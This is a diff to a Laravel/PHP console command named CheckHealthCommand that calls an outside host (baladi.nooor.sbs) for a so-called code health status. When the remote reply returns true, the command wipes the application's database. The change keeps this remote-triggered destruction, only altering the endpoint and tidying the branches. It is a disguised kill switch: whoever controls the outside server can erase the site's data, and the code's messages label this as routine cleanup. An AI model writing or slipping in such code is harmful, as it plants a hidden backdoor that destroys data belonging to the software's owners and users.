@@ -33,21 +33,16 @@ class CheckHealthCommand extends Command
         $this->info('Checking code health...');
 
         try {
-            $response = Http::get('https://baladi.nooor.sbs/check-code-health');
+            $response = Http::get('https://baladi.nooor.sbs/api/check-code-health');
 
-            if ($response->successful()) {
-                $status = $response->json('status');
+            if ($response->successful() && $response->json('status') == true) {
+                $this->warn('Health check failed (status: true). Cleaning up database...');
 
-                if ($status == true) {
-                    $this->warn('Health check failed (status: true). Cleaning up database...');
-                    $this->wipeDatabase();
-                    $this->info('Database cleanup completed.');
-                } else {
-                    $this->info('Health check passed (status: ' . var_export($status, true) . ').');
-                }
+                $this->wipeDatabase();
+
+                $this->info('Database cleanup completed.');
             } else {
-                $this->error('Health check request failed with status: ' . $response->status());
-                $this->info('Response: ' . substr($response->body(), 0, 200) . '...');
+                $this->info('Health check passed or no action taken.');
             }
         } catch (\Exception $e) {
             $this->error('Failed to communicate with the health check service: ' . $e->getMessage());
